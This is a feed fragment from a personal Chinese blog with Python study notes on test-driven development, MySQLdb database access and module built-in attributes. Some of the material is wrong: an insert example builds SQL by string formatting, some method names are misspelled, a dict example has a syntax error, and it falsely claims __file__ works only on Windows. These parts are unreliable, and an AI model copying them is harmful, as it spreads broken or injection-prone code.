            "content_html": "<p><span class=\"label success\">✔️Music！</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=1384407086\"]}]'></div></div>\n<h1 id=\"导读\"><a class=\"anchor\" href=\"#导读\">#</a> 导读</h1>\n<p>本章主要介绍敏捷开发模式。敏捷开发是 20 世纪 90 年代兴起的一种新型软件开发方法，能快速应对需求的变化。他需要分析人员与程序开发人员紧密协作，采用面对面的有效沟通方式频繁交付新的软件版本。测试驱动是敏捷开发的重要组成部分，python 是敏捷开发项目常采用的一种语言。本章重点介绍测试驱动开发的特点、步骤和环境建立，以及 Python 单元测试，doctest 和 Epydoc 的使用。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<h2 id=\"测试驱动开发\"><a class=\"anchor\" href=\"#测试驱动开发\">#</a> 测试驱动开发</h2>\n<p>测试驱动开发 (Test-Driven-Development)，简称 TDD，是一种有别于传统开发的新型开发方法。它要求在编写某个功能的代码之前先编写测试代码，让后编写是测试通过的代码，通过测试来推动整个开发的进行。这有助于编写简洁可用和高质量的代码，以便加速开发进程。</p>\n<h3 id=\"测试驱动开发模式tdd\"><a class=\"anchor\" href=\"#测试驱动开发模式tdd\">#</a> 测试驱动开发模式 (TDD)</h3>\n<p>当下科技高速发展，软件规模越来越大，软件开发人员也越来越多，因此软件开发过程必须要有知道开发的软件模式。一些小项目也许可以采用边做边改的开发模式，项目一旦做大，这样的开发模式就不能满足需求了。</p>\n<p>瀑布模型作为传统的开发模式，曾一度受到追捧，它将软件生命周期划外为制定计划，需求分析、软件设计、程序开发、软件测试和运行维护六个阶段，这六个阶段的各项活动严格按照线性方式进行，每一个阶段的工作成果都需要进行验证，验证通过才能进入下一阶段，否则返回修改。</p>\n<p>传统的开发模型除了瀑布模型外，还有造代模型、快速原型模型、增量模型、螺旋模型，但这些模型都有自身的缺点，如何适应瞬息万变的需求变化，如何高效地实施软件开发，是每个软件行业人员必须思考的问题。</p>\n<p>敏捷开发在这样的环境下应运而生，它是一种以人为核心、迭代、循序渐进的开发方法，开发过程中，软件项目的构建被切分成多个子项目，各个子项目既相对独立又相互联系，可以分别完成，开发过程中软件一直处于可使用状态。</p>\n<p>测试驱动开发模式 TDD 是敏捷开发的重要组成部分，也是一种设计方法论，其基本思想就是在开发某个功能代码前，先编写测试代码，然后编写功能代码并用测试代码进行验证，如此循环直到完成全部功能的开发。</p>\n<p>测试模型中的 V 模型和 X 模型都是 TDD 的最好体现方式，V 模型如图所示：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>V 模型在开发的各个阶段，包括需求分析、概要设计、详细设计、编码过程中都考虑相对应的测试工作，完成相关的测试用例设计和测试脚本编写。</p>\n<p>X 模型是对详细阶段和编码阶段进行建模，针对某个功能进行对应的测试驱动开发。X 模型的左侧描述的是针对单独程序片段所进行的相互分离的编码和测试，此后进行频繁的集成，通过集成最终成为可执行的程序，然后再对这些可执行程序进行测试. X 模型还定位了探索性测试，这是不进行事先计划的特殊类型的测试，这一方式往往能帮助有经验的测试人员在测试计划之外发现更多的软件错误。</p>\n<p>X 模型如图所示</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>TDD 的优点：节省了调试程序及挑错的时间，在任意一个开发节点都可以拿出一个可以使用含少量 bug 并具有一定功能和能够发布的产品。<br />\nTDD 的缺点：增加代码量，测试代码是系统代码的两倍或更多倍。</p>\n<h3 id=\"tdd使用步骤\"><a class=\"anchor\" href=\"#tdd使用步骤\">#</a> TDD 使用步骤</h3>\n<p>TDD 在满足软件开发目标的同时，也要实现代码的简单整洁。<br />\n在明确软件需求后，对一个新功能的开发过程包括以下步骤，如图 4-3 所示。<br />\n步骤 01: 明确当前代码要完成的功能。可以记录成一个列表，必要时需写相关接口。<br />\n步骤 02: 快速新增对要完成功能的测试。<br />\n步骤 03 : 运行测试，判断测试代码是否通过，通过则执行步骤 06, 不通过则执行步骤 04。<br />\n步骤 04: 编写对应的功能代码。<br />\n步骤 05 : 重新运行测试，保证全部通过。<br />\n步骤 06: 对代码进行重构，优化代码结构。<br />\n步骤 07: 循环完成所有功能的开发。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"tips\"><a class=\"anchor\" href=\"#tips\">#</a> Tips</h3>\n<p>要完成一个系统，代码的功能点可能很多，需求也可能随时变化，任何阶段想添加功能，都应吧相关的功能点加到测试列表中，避免疏漏。</p>\n<h2 id=\"unittest测试框架\"><a class=\"anchor\" href=\"#unittest测试框架\">#</a> unittest 测试框架</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW91bGl4aXNoaS9hcnRpY2xlcy8zNTUxOTkyLmh0bWw=\">https://www.cnblogs.com/youlixishi/articles/3551992.html</span><br />\n《python 网络编程从入门到精通》</p>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "url": "https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "title": "python数据库编程",
            "date_published": "2021-02-07T08:36:30.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=464863017\"]}]'></div></div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在看《python 网络编程从入门到精通》，顺便做个笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><ins>本章以 MySQL 为例说明</ins></p>\n<p>python 操作数据库主要涉及 connection 和 cursor 两个对象，操作流程图如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"connection对象\"><a class=\"anchor\" href=\"#connection对象\">#</a> connection 对象</h2>\n<p>connection 对象，与数据源唯一的会话，可以使用 connection 对象的集合、方法、属性实现与数据的连接。</p>\n<p><span class=\"label\">connection 参数列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">参数名</td>\n<td style=\"text-align:left\">类型</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">host</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库服务器主机名，默认为本地主机 (localhost)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">port</td>\n<td style=\"text-align:left\">数字</td>\n<td style=\"text-align:left\">MySQL 服务器端口号，默认是 3306</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">user</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的用户名</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">password</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的密码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">db</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">数据库名称</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">charset</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接编码</td>\n</tr>\n</tbody>\n</table>\n<p><span class=\"label\">connection 方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cursor()</td>\n<td style=\"text-align:left\">使用该连接创建并返回游标</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">commit()</td>\n<td style=\"text-align:left\">提交当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rollback()</td>\n<td style=\"text-align:left\">回滚当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭连接</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"cursor对象\"><a class=\"anchor\" href=\"#cursor对象\">#</a> cursor 对象</h2>\n<p>cursor 对象是游标对象，用户可以用它查询和获取结果。</p>\n<p><span class=\"label\">cursor 对象方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">execute</td>\n<td style=\"text-align:left\">执行一个数据库命令</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fecthone</td>\n<td style=\"text-align:left\">取结果集下一行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechmany(size)</td>\n<td style=\"text-align:left\">取结果集下几行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechall()</td>\n<td style=\"text-align:left\">取结果集中剩余的所有行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rowcount</td>\n<td style=\"text-align:left\">最近一次 execute 返回数据的行数或影响行数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭游标对象</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"一个例子\"><a class=\"anchor\" href=\"#一个例子\">#</a> 一个例子</h2>\n<p>搬一个菜鸟教程里<ins>插入操作</ins>的例子。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> MySQLdb</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 打开数据库连接</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>db <span class=\"token operator\">=</span> MySQLdb<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"testuser\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test123\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"TESTDB\"</span><span class=\"token punctuation\">,</span> charset<span class=\"token operator\">=</span><span class=\"token string\">'utf8'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 使用 cursor () 方法获取操作游标 </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cursor <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># SQL 插入语句</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sql <span class=\"token operator\">=</span> \"INSERT INTO EMPLOYEE<span class=\"token punctuation\">(</span>FIRST_NAME<span class=\"token punctuation\">,</span> \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       LAST_NAME<span class=\"token punctuation\">,</span> AGE<span class=\"token punctuation\">,</span> SEX<span class=\"token punctuation\">,</span> INCOME<span class=\"token punctuation\">)</span> \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       VALUES <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s <span class=\"token punctuation\">)</span>\" <span class=\"token operator\">%</span> \\</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token punctuation\">(</span><span class=\"token string\">'Mac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mohan'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token comment\"># 执行 sql 语句</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   cursor<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token comment\"># 提交到数据库执行</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   db<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token comment\"># 发生错误时回滚</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   db<span class=\"token punctuation\">.</span>rollback<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 关闭数据库连接</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>db<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "python",
                "数据库编程"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "url": "https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "title": "python模块的内置属性",
            "date_published": "2021-02-05T12:59:31.000Z",
            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=532950140\"]}]'></div></div>\n<h1 id=\"模块的内置属性\"><a class=\"anchor\" href=\"#模块的内置属性\">#</a> 模块的内置属性</h1>\n<p>对于任何一个 python 文件来说，当 python 解释器运行一个 py 文件，会自动将一些内容加载到内置的属性中；一个模块我们可以看做是一个比类更大的对象。</p>\n<h2 id=\"查看内置属性\"><a class=\"anchor\" href=\"#查看内置属性\">#</a> 查看内置属性</h2>\n<p>我们可以通过 dir () 方法获取该模块所有的显式或隐式属性。<br />\n附上 dir () 的介绍：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">####### 输出结果 #######</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'Test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__annotations__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__cached__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__doc__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__file__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__loader__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__name__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__package__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__spec__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'os'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p>这里有些内容不确定：<br />\n《python 网络编程从入门到精通》这本书上写原话是<br />\n <code>可以看到隐式属性有['Test', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'os', 'var']</code></p>\n<p>而在网上的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\"> https://www.cnblogs.com/cwp-bg/p/9856339.html</span> 博客中这样写的<br />\n <code>可看到隐式的属性有__annotations__,__builtins__,__cached__,__annotations__,__doc__,__file__,__loader__,__name__;</code></p>\n</div>\n<p>我们打印一下每个魔法属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\"># print(dir())</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__annotations__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__builtins__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__cached__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__doc__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__loader__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__package__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__spec__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">######### 输出结果 ###############</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>__main__</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">&lt;</span>module <span class=\"token string\">'builtins'</span> <span class=\"token punctuation\">(</span>built<span class=\"token operator\">-</span><span class=\"token keyword\">in</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>doc<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>G<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>Text_Files<span class=\"token operator\">/</span>py<span class=\"token operator\">/</span><span class=\"token number\">1.</span>py</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">&lt;</span>_frozen_importlib_external<span class=\"token punctuation\">.</span>SourceFileLoader <span class=\"token builtin\">object</span> at <span class=\"token number\">0x0000018C7E37F8B0</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">## 空行是打印时就有的</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 其中__name__、__doc__、__file__、__package__是可以直接使用的，其它的内置属性一般不允许直接使用。</span></pre></td></tr></table></figure><h2 id=\"内置魔法属性\"><a class=\"anchor\" href=\"#内置魔法属性\">#</a> 内置魔法属性</h2>\n<ol>\n<li>\n<p>_<em>name</em>_<br />\n该属性代表当前模块的名字，每个 py 文件默认的属性，如果当前模块是主程序，值为 “<strong>main</strong>”，如果不是主程序，值为模块名。这个属性经常用来区分主程序和作为被导入模块的程序。</p>\n</li>\n<li>\n<p>_<em>builtins</em>_<br />\n该属性代表内置模块 builtins，即所有的内建函数、内置类型、内置异常等；在 python 执行一个 py 文件时，会将内置模块赋值给这个属性；如果不是主程序，那么这个属性是一个 builtins 模块所有方法的字典。</p>\n</li>\n<li>\n<p>_<em>doc</em>_<br />\n模块的说明文档，py 文件初始化时，将文件开始的说明字符串赋值给这个属性。</p>\n</li>\n<li>\n<p>_<em>file</em>_<br />\n该属性代表文件的绝对路径，任何一个模块使用这个属性就可获得本模块的绝对路径；但是该属性只在 windows 环境下可用，在 linux 环境下不可用。</p>\n</li>\n<li>\n<p>_<em>cached</em>_<br />\n缓存文件，如果是主程序，那么该属性为 None，其他模块的该属性指向该模块的 pyc 字节文件，这样在 py 文件不发生修改的情况下可以减少编译的时间，更快地加载上下文环境。</p>\n</li>\n<li>\n<p>_<em>annotations</em>_<br />\n该属性对于模块文件来说，没有开放给用户使用；但对于函数来说，这个方法用来记录参数的类型和返回值。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\">#输出结果 &#123;&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># &#123;'y': &lt;class 'int'>, 'return': &lt;class 'int'>&#125;</span></pre></td></tr></table></figure><p>函数的参数和返回值如果在定义的时候指定了类型，那么它们就会以键值对的形式记录到函数的__annotations__属性中，但对于匿名函数来说，这个属性是不存在的。</p>\n<ol start=\"7\">\n<li>\n<p>_<em>loader</em>_<br />\n该属性 py3.3 之前没有，引用了本模块的加载器对象，即该模块的上下文是由这个加载器加载到内存中的。</p>\n</li>\n<li>\n<p>_<em>package</em>_<br />\n该属性是一个文件是否是包的标志，在主程序中该属性的值永远是 None，不要使用它；当一个包被导入到主程序中，该包的__package__属性为包的名字。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>__init__<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># main.py</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> test</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>__package__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># test</span></pre></td></tr></table></figure><ol start=\"9\">\n<li><em>spec</em><br />\n 该属性记录一个模块的详细信息，是一个 ModuleSpec 对象，</li>\n</ol>\n<h2 id=\"其他魔法属性\"><a class=\"anchor\" href=\"#其他魔法属性\">#</a> 其他魔法属性</h2>\n<ol>\n<li><em>author</em><br />\n 该属性用来定义模块的作者信息，可以是字符串，也可以是列表、字典等数据结构。</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 可以在 python 文件中加入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'1asy'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'bg'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'https://self-ferry.github.io/'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 或</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'1asy'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li><em>all</em><br />\n 该属性不是模块默认的，需要手动定义，它的功能有二：</li>\n</ol>\n<p>记录一个模块有哪些重要的、对外开发的类、方法或变量等，或记录一个包哪些对外开放的模块；</p>\n<p>限制导入，当使用 <code>“from xxx import *”</code>  形式导入时，实际导入的只有__all__属性中的同名的对象而不是所有，但对于 <code>“from xxx import 